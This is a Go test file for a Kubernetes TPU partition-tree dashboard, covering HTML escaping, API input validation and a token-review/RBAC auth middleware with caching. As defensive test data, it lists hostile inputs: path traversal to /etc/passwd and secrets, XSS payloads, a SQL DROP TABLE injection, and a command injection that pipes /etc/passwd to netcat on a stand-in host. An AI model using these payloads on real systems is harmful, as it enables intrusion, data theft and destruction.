/*
Copyright 2026 Google LLC.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package main

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"reflect"
	"regexp"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	partitionv1beta1 "github.com/ai-on-gke/partition-tree/api/v1beta1"
	authenticationv1 "k8s.io/api/authentication/v1"
	authorizationv1 "k8s.io/api/authorization/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/kubernetes/fake"
	k8stesting "k8s.io/client-go/testing"
)

func TestHandleDashboard(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	rec := httptest.NewRecorder()

	handleDashboard(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected status %d, got %d", http.StatusOK, rec.Code)
	}
	contentType := rec.Header().Get("Content-Type")
	if contentType != "text/html; charset=utf-8" {
		t.Errorf("expected Content-Type text/html; charset=utf-8, got %q", contentType)
	}
	if rec.Body.Len() == 0 {
		t.Error("expected non-empty response body")
	}

	body := rec.Body.String()

	// Verify escapeHtml escapes single quotes using flexible regex matching
	escapeQuoteRe := regexp.MustCompile(`\.replace\(\s*/'/g\s*,\s*['"]&#39;['"]\s*\)`)
	if !escapeQuoteRe.MatchString(body) {
		t.Error("expected dashboard.html escapeHtml function to escape single quotes with &#39;")
	}

	// Verify inline onclick vulnerability is removed from retry button
	inlineOnClickRe := regexp.MustCompile(`onclick\s*=\s*["']openDetailPanel\(`)
	if inlineOnClickRe.MatchString(body) {
		t.Error("expected dashboard.html to not use inline onclick handler for openDetailPanel")
	}

	// Verify ensureMatrixPanels creates canvas element safely and passes canvasId to setupCanvasInteraction
	canvasIdRe := regexp.MustCompile(`canvas\.id\s*=\s*canvasId`)
	if !canvasIdRe.MatchString(body) {
		t.Error("expected dashboard.html ensureMatrixPanels to set canvas.id directly on created element")
	}
	setupCanvasRe := regexp.MustCompile(`setupCanvasInteraction\(\s*canvasId\s*\)`)
	if !setupCanvasRe.MatchString(body) {
		t.Error("expected dashboard.html ensureMatrixPanels to pass canvasId to setupCanvasInteraction")
	}

	// Verify ensureMatrixPanels CSS selector escaping
	if !strings.Contains(body, "CSS.escape(") {
		t.Error("expected dashboard.html ensureMatrixPanels to use CSS.escape for selector query")
	}

	// Verify ensureAccelTypeFilters data-value attribute is escaped
	dataValueRe := regexp.MustCompile(`data-value=["']\s*\+\s*escapeHtml\(`)
	if !dataValueRe.MatchString(body) {
		t.Error("expected dashboard.html ensureAccelTypeFilters to escape data-value attribute")
	}
}

func TestHandleTreeDetailDemo_HostileAndInvalidInputs(t *testing.T) {
	dg := newDemoGenerator()
	handler := handleTreeDetailDemo(dg)

	tests := []struct {
		name         string
		pathValue    string
		expectedCode int
	}{
		{
			name:         "empty tree name",
			pathValue:    "",
			expectedCode: http.StatusBadRequest,
		},
		{
			name:         "path traversal attempt 1",
			pathValue:    "../../etc/passwd",
			expectedCode: http.StatusNotFound,
		},
		{
			name:         "path traversal attempt 2",
			pathValue:    "../../../var/run/secrets",
			expectedCode: http.StatusNotFound,
		},
		{
			name:         "XSS script tag in tree name",
			pathValue:    "<script>alert(1)</script>",
			expectedCode: http.StatusNotFound,
		},
		{
			name:         "XSS image payload in tree name",
			pathValue:    "\"><img src=x onerror=alert(1)>",
			expectedCode: http.StatusNotFound,
		},
		{
			name:         "SQL injection payload in tree name",
			pathValue:    "tree' OR '1'='1'; DROP TABLE trees; --",
			expectedCode: http.StatusNotFound,
		},
		{
			name:         "command injection payload in tree name",
			pathValue:    "; cat /etc/passwd | nc attacker 1337",
			expectedCode: http.StatusNotFound,
		},
		{
			name:         "null byte and control characters in tree name",
			pathValue:    "tree\x00\r\nmalicious",
			expectedCode: http.StatusNotFound,
		},
		{
			name:         "non-existent validly formatted tree name",
			pathValue:    "gke-tpu-v7x-pool-999999",
			expectedCode: http.StatusNotFound,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/api/trees/"+tc.pathValue, nil)
			req.SetPathValue("name", tc.pathValue)
			rec := httptest.NewRecorder()

			handler(rec, req)

			if rec.Code != tc.expectedCode {
				t.Errorf("pathValue %q: expected status %d, got %d (body: %s)",
					tc.pathValue, tc.expectedCode, rec.Code, rec.Body.String())
			}
		})
	}
}

func TestHandleTreeDetailDemo_ValidTree(t *testing.T) {
	dg := newDemoGenerator()
	if len(dg.trees) == 0 {
		t.Fatal("expected demoGenerator to have trees initialized")
	}

	validName := dg.trees[0].Name
	req := httptest.NewRequest(http.MethodGet, "/api/trees/"+validName, nil)
	req.SetPathValue("name", validName)
	rec := httptest.NewRecorder()

	handler := handleTreeDetailDemo(dg)
	handler(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected status %d for valid tree %q, got %d", http.StatusOK, validName, rec.Code)
	}

	var detail TreeDetailResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &detail); err != nil {
		t.Fatalf("failed to decode response JSON: %v", err)
	}
	if detail.Name != validName {
		t.Errorf("expected tree name %q, got %q", validName, detail.Name)
	}
}

func TestBuildMockTree_HostileTopologies(t *testing.T) {
	dg := newDemoGenerator()

	hostileTopologies := []string{
		"",
		"-1x-5",
		"0x0",
		"invalid",
		"4x-2x0",
		"999999999999999999999999999999999999",
		"<script>alert(1)</script>",
		"../../etc/passwd",
	}

	for _, topo := range hostileTopologies {
		t.Run(topo, func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Fatalf("buildMockTree panicked on input %q: %v", topo, r)
				}
			}()

			root := dg.buildMockTree(topo, partitionv1beta1.PartitionStateHealthy, false, "v7x", "test-tree")
			if root == nil {
				t.Fatalf("expected non-nil root for topology %q", topo)
			}
		})
	}
}

func TestWorstState_UnknownOrHostileInputs(t *testing.T) {
	tests := []struct {
		a        partitionv1beta1.PartitionStateType
		b        partitionv1beta1.PartitionStateType
		expected partitionv1beta1.PartitionStateType
	}{
		{
			a:        partitionv1beta1.PartitionStateType("<script>alert(1)</script>"),
			b:        partitionv1beta1.PartitionStateHealthy,
			expected: partitionv1beta1.PartitionStateType("<script>alert(1)</script>"), // Unknown priority (4) > Healthy (5)
		},
		{
			a:        partitionv1beta1.PartitionStateUnhealthy,
			b:        partitionv1beta1.PartitionStateType("malicious-state"),
			expected: partitionv1beta1.PartitionStateUnhealthy, // Unhealthy (1) > Unknown (4)
		},
	}

	for _, tc := range tests {
		result := worstState(tc.a, tc.b)
		if result != tc.expected {
			t.Errorf("worstState(%q, %q) = %q; expected %q", tc.a, tc.b, result, tc.expected)
		}
	}
}

func TestWithAuth_MissingBearerToken(t *testing.T) {
	client := fake.NewSimpleClientset()
	handlerCalled := false
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		handlerCalled = true
	})

	h := withAuth(client, "list", nil, authOptions{}, next)

	tests := []struct {
		name       string
		authHeader string
	}{
		{name: "no header", authHeader: ""},
		{name: "basic auth", authHeader: "Basic dXNlcjpwYXNz"},
		{name: "bearer only without space", authHeader: "Bearer"},
		{name: "empty bearer token", authHeader: "Bearer    "},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			handlerCalled = false
			req := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
			if tt.authHeader != "" {
				req.Header.Set("Authorization", tt.authHeader)
			}
			rec := httptest.NewRecorder()

			h.ServeHTTP(rec, req)

			if rec.Code != http.StatusUnauthorized {
				t.Errorf("expected status %d, got %d", http.StatusUnauthorized, rec.Code)
			}
			if handlerCalled {
				t.Error("next handler should not have been called")
			}
			wwwAuth := rec.Header().Get("WWW-Authenticate")
			if wwwAuth == "" {
				t.Error("expected WWW-Authenticate header")
			}
		})
	}
}

func TestWithAuth_CaseInsensitiveBearer(t *testing.T) {
	client := fake.NewSimpleClientset()
	client.PrependReactor("create", "tokenreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		tr := action.(k8stesting.CreateAction).GetObject().(*authenticationv1.TokenReview)
		res := tr.DeepCopy()
		res.Status.Authenticated = true
		res.Status.User = authenticationv1.UserInfo{
			Username: "alice",
			Groups:   []string{"system:authenticated"},
		}
		return true, res, nil
	})
	client.PrependReactor("create", "subjectaccessreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		sar := action.(k8stesting.CreateAction).GetObject().(*authorizationv1.SubjectAccessReview)
		res := sar.DeepCopy()
		res.Status.Allowed = true
		return true, res, nil
	})

	for _, headerVal := range []string{"bearer valid-token", "Bearer valid-token", "BEARER valid-token"} {
		t.Run(headerVal, func(t *testing.T) {
			handlerCalled := false
			next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				handlerCalled = true
				w.WriteHeader(http.StatusOK)
			})

			h := withAuth(client, "list", newAuthCache(10), authOptions{}, next)
			req := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
			req.Header.Set("Authorization", headerVal)
			rec := httptest.NewRecorder()

			h.ServeHTTP(rec, req)

			if rec.Code != http.StatusOK {
				t.Fatalf("expected status %d, got %d", http.StatusOK, rec.Code)
			}
			if !handlerCalled {
				t.Error("expected next handler to be called")
			}
		})
	}
}

func TestWithAuth_InvalidBearerToken(t *testing.T) {
	client := fake.NewSimpleClientset()
	client.PrependReactor("create", "tokenreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		tr := action.(k8stesting.CreateAction).GetObject().(*authenticationv1.TokenReview)
		res := tr.DeepCopy()
		res.Status.Authenticated = false
		return true, res, nil
	})

	handlerCalled := false
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		handlerCalled = true
	})

	h := withAuth(client, "list", nil, authOptions{}, next)

	req := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
	req.Header.Set("Authorization", "Bearer bad-token")
	rec := httptest.NewRecorder()

	h.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("expected status %d, got %d", http.StatusUnauthorized, rec.Code)
	}
	if handlerCalled {
		t.Error("next handler should not have been called")
	}
}

func TestWithAuth_DeniedSubjectAccessReview(t *testing.T) {
	client := fake.NewSimpleClientset()
	client.PrependReactor("create", "tokenreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		tr := action.(k8stesting.CreateAction).GetObject().(*authenticationv1.TokenReview)
		res := tr.DeepCopy()
		res.Status.Authenticated = true
		res.Status.User = authenticationv1.UserInfo{
			Username: "alice",
			Groups:   []string{"system:authenticated"},
			UID:      "12345",
		}
		return true, res, nil
	})
	client.PrependReactor("create", "subjectaccessreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		sar := action.(k8stesting.CreateAction).GetObject().(*authorizationv1.SubjectAccessReview)
		res := sar.DeepCopy()
		res.Status.Allowed = false
		res.Status.Reason = "RBAC denied"
		return true, res, nil
	})

	handlerCalled := false
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		handlerCalled = true
	})

	h := withAuth(client, "list", nil, authOptions{}, next)

	req := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
	req.Header.Set("Authorization", "Bearer valid-token")
	rec := httptest.NewRecorder()

	h.ServeHTTP(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected status %d, got %d", http.StatusForbidden, rec.Code)
	}
	if handlerCalled {
		t.Error("next handler should not have been called")
	}
}

func TestWithAuth_AllowedSubjectAccessReview(t *testing.T) {
	client := fake.NewSimpleClientset()
	client.PrependReactor("create", "tokenreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		tr := action.(k8stesting.CreateAction).GetObject().(*authenticationv1.TokenReview)
		res := tr.DeepCopy()
		res.Status.Authenticated = true
		res.Status.User = authenticationv1.UserInfo{
			Username: "alice",
			Groups:   []string{"system:authenticated"},
			UID:      "12345",
			Extra: map[string]authenticationv1.ExtraValue{
				"custom-key": []string{"val1", "val2"},
			},
		}
		return true, res, nil
	})

	var inspectedSAR *authorizationv1.SubjectAccessReview
	client.PrependReactor("create", "subjectaccessreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		sar := action.(k8stesting.CreateAction).GetObject().(*authorizationv1.SubjectAccessReview)
		inspectedSAR = sar.DeepCopy()
		res := sar.DeepCopy()
		res.Status.Allowed = true
		return true, res, nil
	})

	handlerCalled := false
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		handlerCalled = true
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	})

	h := withAuth(client, "list", nil, authOptions{}, next)

	req := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
	req.Header.Set("Authorization", "Bearer valid-token")
	rec := httptest.NewRecorder()

	h.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected status %d, got %d", http.StatusOK, rec.Code)
	}
	if !handlerCalled {
		t.Fatal("expected next handler to be called")
	}

	if inspectedSAR == nil {
		t.Fatal("expected SubjectAccessReview to be created")
	}
	if inspectedSAR.Spec.User != "alice" {
		t.Errorf("expected SAR user 'alice', got %q", inspectedSAR.Spec.User)
	}
	if inspectedSAR.Spec.ResourceAttributes.Group != "partition.tpu.google.com" {
		t.Errorf("expected group 'partition.tpu.google.com', got %q", inspectedSAR.Spec.ResourceAttributes.Group)
	}
	if inspectedSAR.Spec.ResourceAttributes.Resource != "partitiontrees" {
		t.Errorf("expected resource 'partitiontrees', got %q", inspectedSAR.Spec.ResourceAttributes.Resource)
	}
	if inspectedSAR.Spec.ResourceAttributes.Verb != "list" {
		t.Errorf("expected verb 'list', got %q", inspectedSAR.Spec.ResourceAttributes.Verb)
	}
	if inspectedSAR.Spec.ResourceAttributes.Name != "" {
		t.Errorf("expected empty name for list verb, got %q", inspectedSAR.Spec.ResourceAttributes.Name)
	}
}

func TestWithAuth_DetailRouteCheckVerbAndName(t *testing.T) {
	client := fake.NewSimpleClientset()
	client.PrependReactor("create", "tokenreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		tr := action.(k8stesting.CreateAction).GetObject().(*authenticationv1.TokenReview)
		res := tr.DeepCopy()
		res.Status.Authenticated = true
		res.Status.User = authenticationv1.UserInfo{
			Username: "bob",
		}
		return true, res, nil
	})

	var inspectedSAR *authorizationv1.SubjectAccessReview
	client.PrependReactor("create", "subjectaccessreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		sar := action.(k8stesting.CreateAction).GetObject().(*authorizationv1.SubjectAccessReview)
		inspectedSAR = sar.DeepCopy()
		res := sar.DeepCopy()
		res.Status.Allowed = true
		return true, res, nil
	})

	mux := http.NewServeMux()
	treeDetailHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	mux.Handle("GET /api/trees/{name}", withAuth(client, "get", nil, authOptions{}, treeDetailHandler))

	req := httptest.NewRequest(http.MethodGet, "/api/trees/tpu-v4-tree", nil)
	req.Header.Set("Authorization", "Bearer valid-token")
	rec := httptest.NewRecorder()

	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected status %d, got %d", http.StatusOK, rec.Code)
	}
	if inspectedSAR == nil {
		t.Fatal("expected SubjectAccessReview to be created")
	}
	if inspectedSAR.Spec.ResourceAttributes.Verb != "get" {
		t.Errorf("expected verb 'get', got %q", inspectedSAR.Spec.ResourceAttributes.Verb)
	}
	if inspectedSAR.Spec.ResourceAttributes.Name != "tpu-v4-tree" {
		t.Errorf("expected resource name 'tpu-v4-tree', got %q", inspectedSAR.Spec.ResourceAttributes.Name)
	}
}

func TestWithAuth_CacheHitAvoidsAPIServer(t *testing.T) {
	client := fake.NewSimpleClientset()
	var trCount int32
	var sarCount int32

	client.PrependReactor("create", "tokenreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		atomic.AddInt32(&trCount, 1)
		tr := action.(k8stesting.CreateAction).GetObject().(*authenticationv1.TokenReview)
		res := tr.DeepCopy()
		res.Status.Authenticated = true
		res.Status.User = authenticationv1.UserInfo{
			Username: "cached-user",
		}
		return true, res, nil
	})
	client.PrependReactor("create", "subjectaccessreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		atomic.AddInt32(&sarCount, 1)
		sar := action.(k8stesting.CreateAction).GetObject().(*authorizationv1.SubjectAccessReview)
		res := sar.DeepCopy()
		res.Status.Allowed = true
		return true, res, nil
	})

	cache := newAuthCache(100)
	opts := authOptions{
		cacheTTL: 10 * time.Minute,
	}
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	h := withAuth(client, "list", cache, opts, next)

	// First request: cache miss, triggers 1 TR and 1 SAR
	req1 := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
	req1.Header.Set("Authorization", "Bearer my-token")
	rec1 := httptest.NewRecorder()
	h.ServeHTTP(rec1, req1)
	if rec1.Code != http.StatusOK {
		t.Fatalf("first request failed: %d", rec1.Code)
	}
	if atomic.LoadInt32(&trCount) != 1 || atomic.LoadInt32(&sarCount) != 1 {
		t.Fatalf("expected 1 TR and 1 SAR on miss, got TR=%d, SAR=%d", trCount, sarCount)
	}

	// Repeated 5 requests: cache hit, no additional TR or SAR calls
	for i := 0; i < 5; i++ {
		req := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
		req.Header.Set("Authorization", "Bearer my-token")
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		if rec.Code != http.StatusOK {
			t.Fatalf("repeated request %d failed: %d", i, rec.Code)
		}
	}

	if atomic.LoadInt32(&trCount) != 1 || atomic.LoadInt32(&sarCount) != 1 {
		t.Errorf("expected still 1 TR and 1 SAR after cache hits, got TR=%d, SAR=%d", trCount, sarCount)
	}
}

func TestWithAuth_NegativeCache(t *testing.T) {
	client := fake.NewSimpleClientset()
	var trCount int32

	client.PrependReactor("create", "tokenreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		atomic.AddInt32(&trCount, 1)
		tr := action.(k8stesting.CreateAction).GetObject().(*authenticationv1.TokenReview)
		res := tr.DeepCopy()
		res.Status.Authenticated = false
		return true, res, nil
	})

	cache := newAuthCache(100)
	opts := authOptions{
		negTTL: 10 * time.Minute,
	}
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	h := withAuth(client, "list", cache, opts, next)

	// First invalid request: triggers TR
	req1 := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
	req1.Header.Set("Authorization", "Bearer bad-token")
	rec1 := httptest.NewRecorder()
	h.ServeHTTP(rec1, req1)
	if rec1.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401, got %d", rec1.Code)
	}
	if atomic.LoadInt32(&trCount) != 1 {
		t.Fatalf("expected 1 TR, got %d", trCount)
	}

	// Second invalid request: hits negative cache, no new TR
	req2 := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
	req2.Header.Set("Authorization", "Bearer bad-token")
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if rec2.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401 on cached rejection, got %d", rec2.Code)
	}
	if atomic.LoadInt32(&trCount) != 1 {
		t.Errorf("expected still 1 TR after negative cache hit, got %d", trCount)
	}
}

func TestWithAuth_AudienceValidation(t *testing.T) {
	client := fake.NewSimpleClientset()
	var inspectedAudiences []string

	client.PrependReactor("create", "tokenreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		tr := action.(k8stesting.CreateAction).GetObject().(*authenticationv1.TokenReview)
		inspectedAudiences = tr.Spec.Audiences
		res := tr.DeepCopy()
		res.Status.Authenticated = true
		res.Status.User = authenticationv1.UserInfo{Username: "aud-user"}
		return true, res, nil
	})
	client.PrependReactor("create", "subjectaccessreviews", func(action k8stesting.Action) (handled bool, ret runtime.Object, err error) {
		sar := action.(k8stesting.CreateAction).GetObject().(*authorizationv1.SubjectAccessReview)
		res := sar.DeepCopy()
		res.Status.Allowed = true
		return true, res, nil
	})

	opts := authOptions{
		audience: "ptree-dashboard.internal",
	}
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	h := withAuth(client, "list", newAuthCache(10), opts, next)

	req := httptest.NewRequest(http.MethodGet, "/api/trees", nil)
	req.Header.Set("Authorization", "Bearer valid-token")
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", rec.Code)
	}
	if len(inspectedAudiences) != 1 || inspectedAudiences[0] != "ptree-dashboard.internal" {
		t.Errorf("expected audiences ['ptree-dashboard.internal'], got %v", inspectedAudiences)
	}
}

func TestConvertExtra(t *testing.T) {
	if convertExtra(nil) != nil {
		t.Error("expected nil output for nil input")
	}

	in := map[string]authenticationv1.ExtraValue{
		"groups": []string{"g1", "g2"},
	}
	got := convertExtra(in)
	expected := map[string]authorizationv1.ExtraValue{
		"groups": []string{"g1", "g2"},
	}
	if !reflect.DeepEqual(got, expected) {
		t.Errorf("expected %v, got %v", expected, got)
	}
}
